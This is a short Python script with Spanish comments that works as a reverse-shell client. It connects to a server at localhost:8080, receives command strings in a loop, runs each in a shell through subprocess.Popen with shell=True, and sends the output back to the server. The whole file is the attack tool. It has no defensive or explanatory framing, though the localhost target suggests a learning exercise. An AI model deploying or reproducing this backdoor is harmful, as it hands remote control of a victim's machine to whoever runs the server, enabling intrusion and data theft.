import socket
import subprocess

cliente = socket.socket()

try:
    # Nos conectamos al servidor
    cliente.connect(("localhost", 8080))

    # Enviamos el mensaje con valor 1, codificado
    cliente.send("1".encode("ascii"))

    while True:
        
        # Comando un bytes, que se envia al server
        comandoBytes = cliente.recv(1024)
        
        # Comando decodificado
        comandoDecodificado = comandoBytes.decode("ascii")

        # Ejecutar el comando shell
        comando = subprocess.Popen(
            comandoDecodificado,
            shell = True,
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE,
        )
        print(comando)
        
        # Enviar el comando al servidor
        cliente.send(comando.stdout.read())

except Exception as e:
    raise e